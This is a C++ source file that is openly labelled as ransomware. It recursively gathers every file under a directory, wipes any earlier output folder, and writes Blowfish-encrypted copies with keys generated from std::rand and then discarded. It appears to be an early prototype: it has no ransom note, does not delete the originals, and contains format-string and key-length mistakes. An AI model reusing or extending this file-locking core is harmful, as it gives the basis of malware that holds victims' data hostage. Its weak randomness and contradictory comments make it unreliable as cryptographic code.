#include "ransomware.h"

#include <iostream>
#include <filesystem>
#include <exception>
#include <vector>
#include <openssl/evp.h>
//#include <openssl/aes.h>

#include <fmt/format.h>
#include <fstream>

Encryptor::Encryptor(std::filesystem::path const &rootPath)
        : rootPath_(rootPath) {
    auto rootEntry = std::filesystem::directory_entry(rootPath);
    if (!rootEntry.is_directory()) {
        throw std::runtime_error(fmt::format("{} is not a directory", std::filesystem::absolute(rootPath).string()));
    }

    encryptedDir_ = rootPath;
    encryptedDir_ /= std::filesystem::path(ENCRYPTED_DIR_NAME);
    std::cout << fmt::format("Encrypted dir path: {}\n", encryptedDir_.string()) << std::flush;

    if (std::filesystem::exists(encryptedDir_)) {
        std::filesystem::remove_all(encryptedDir_);
//        throw std::runtime_error(fmt::format("{} already exists", std::filesystem::absolute(encryptedDir_).string()));
    }

    ProcessDirectory(rootEntry);

    for (auto &file: regularFiles_) {
        std::cout << fmt::format("Found regular file for encryption: {}\n", file.string()) << std::flush;
    }

    std::filesystem::create_directory(encryptedDir_);
    for (auto &dir: directories_) {
        auto path = encryptedDir_;
        path /= dir.lexically_relative(rootPath);
        std::filesystem::create_directory(path);
    }
}

void Encryptor::ProcessDirectory(const std::filesystem::directory_entry &rootEntry) {
    for (auto &e: std::filesystem::recursive_directory_iterator(rootEntry)) {
        if (e.is_regular_file()) {
            regularFiles_.emplace_back(e.path());
        } else if (e.is_directory()) {
            directories_.emplace_back(e.path());
        }
    }
}

void Encryptor::Encrypt() {
    for (auto &filePath: regularFiles_) {
        EncryptRegularFile(filePath);
    }

    std::cout << "Encryption finished\n" << std::flush;
}

unsigned char *generate_key(int length) {
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";
    auto *randomString = static_cast<unsigned char *>(calloc(length + 1, sizeof(char)));
    int key;

    if (randomString) {
        for (int n = 0; n < length; n++) {
            key = std::rand() % (int) (sizeof(charset) - 1);
            randomString[n] = charset[key];
        }

        randomString[length] = '\0';
    }
    return randomString;
}

int encrypt(std::filesystem::path const &from, std::filesystem::path const &to) {
    std::cout << fmt::format("File paths from = {} to = {}\n", from.string(), to.string()) << std::flush;
    FILE *from_file = std::fopen(from.c_str(), "rb");
    FILE *to_file = std::fopen(to.c_str(), "wb");
    if (!from_file) {
        std::perror(fmt::format("File opening failed {} or {}", from.string()).c_str());
        return EXIT_FAILURE;
    }
    if (!to_file) {
        std::perror(fmt::format("File opening failed {}", to.string()).c_str());
        return EXIT_FAILURE;
    }

    const unsigned char *iv = generate_key(16);
    const unsigned char *key = generate_key(32);

    int chunk_size = 512;
    auto *inbuf = static_cast<unsigned char *>(calloc(chunk_size, sizeof(unsigned char)));
    auto *outbuf = static_cast<unsigned char *>(calloc(chunk_size + EVP_MAX_BLOCK_LENGTH, sizeof(unsigned char)));
    int inlen;
    int outlen;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

    EVP_CIPHER_CTX_init(ctx);
    EVP_CipherInit_ex(ctx, EVP_bf_cbc(), nullptr, nullptr, nullptr, 1); // 1 encrypt - 0 decrypt
    EVP_CIPHER_CTX_set_key_length(ctx, 16);
    EVP_CipherInit_ex(ctx, nullptr, nullptr, key, iv, 1);

    while (true) {
        inlen = fread(inbuf, 1, chunk_size, from_file);
        if (inlen <= 0) {
            break;
        }
        if (!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)) {
            EVP_CIPHER_CTX_cleanup(ctx);
            return EXIT_FAILURE;
        }
        fwrite(outbuf, 1, outlen, to_file);
    }
    if (!EVP_CipherFinal_ex(ctx, outbuf, &outlen)) {
        EVP_CIPHER_CTX_cleanup(ctx);
        return EXIT_FAILURE;
    }
    fwrite(outbuf, 1, outlen, to_file);
    EVP_CIPHER_CTX_cleanup(ctx);

    fclose(from_file);
    fclose(to_file);
    free((void *) key);
    free((void *) iv);
    return 0;
}

void Encryptor::EncryptRegularFile(std::filesystem::path const &filePath) {
    std::cout << fmt::format("Processing regular file: {}\n", filePath.string()) << std::flush;
    auto encryptedPath = encryptedDir_;
    encryptedPath /= filePath.lexically_relative(rootPath_);
    encryptedPath += ".encrypted";

//    std::filesystem::copy(filePath, encryptedPath);
    std::ofstream outfile(encryptedPath);
    encrypt(filePath, encryptedPath);
    // TODO: actually encrypt

    std::cout << fmt::format("Encrypted to: {}\n", encryptedPath.string()) << std::flush;
}
